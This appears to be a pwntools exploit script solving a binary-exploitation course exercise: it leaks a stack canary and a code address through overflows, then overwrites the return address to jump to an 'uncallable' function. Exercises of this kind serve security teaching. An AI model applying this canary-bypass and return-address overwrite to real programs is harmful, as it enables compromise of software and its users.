#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise3/exercise3b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
if args.GDB:
    print("GDB", r.recvline())

print(r.recvline())
r.sendline(b"A"*95)
print(r.recvline())
can = r.recvline()[:4]
print("CANERAY is: ", can)

print(r.recvline())
print(r.recvline())
r.sendline(b"A"*96 + can)
print(r.recvline())
print_hello = bytes([0x88]) + r.recvline()[:5]
print_hello = int.from_bytes(print_hello, "little")
print("print_hello is: ", hex(print_hello))

uncallable = print_hello - 31
print("uncallable is: ", hex(uncallable))
print(r.recvline())
print(r.recvline())
r.sendline(b"A"*96 + can + b"A"*36 + p64(uncallable))

print(r.recvall())
